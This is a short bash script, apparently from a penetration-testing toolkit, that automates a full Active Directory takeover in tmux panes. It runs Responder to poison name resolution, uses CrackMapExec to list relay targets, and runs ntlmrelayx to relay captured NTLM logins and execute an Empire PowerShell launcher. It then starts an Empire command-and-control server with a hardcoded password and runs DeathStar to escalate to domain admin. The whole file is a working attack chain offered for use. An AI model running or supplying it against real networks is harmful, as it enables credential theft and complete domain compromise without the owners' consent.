#!/bin/bash
HOSTIP=$1
if  [[ -z "$HOSTIP" ]]; then
    echo -e "\n"
    read -p "Host IP (192.168.1.20): " HOSTIP
fi
CIDR=$2
if  [[ -z "$CIDR" ]]; then
    echo -e "\n"
    read -p "Subnet (192.168.1.0/24): " CIDR
fi
tmux new-session -d -s instantdomainadmin ;
tmux send-keys -t instantdomainadmin "cd /opt/Responder && python ./Responder.py -I eth0 -r -d -w -e $HOSTIP"  C-m
tmux new-window \;
tmux split-window -h ;
tmux select-pane -L
tmux send-keys -t instantdomainadmin "cme smb $CIDR --gen-relay-list targets.txt "  C-m
tmux select-pane -R
tmux send-keys -t instantdomainadmin "python /usr/local/bin/ntlmrelayx.py -tf targets.txt -c <insert your Empire Powershell launcher here>"
tmux new-window \;
tmux split-window -h ;
tmux select-pane -L
tmux send-keys -t instantdomainadmin "cd /opt/Empire && ./empire --rest --username empireadmin --password Password123!" C-m
tmux select-pane -R
tmux send-keys -t instantdomainadmin "sleep 10 && cd /opt/DeathStar && python3 ./DeathStar.py -u empireadmin -p Password123! -lip $HOSTIP"  C-m
tmux attach-session -d -t instantdomainadmin
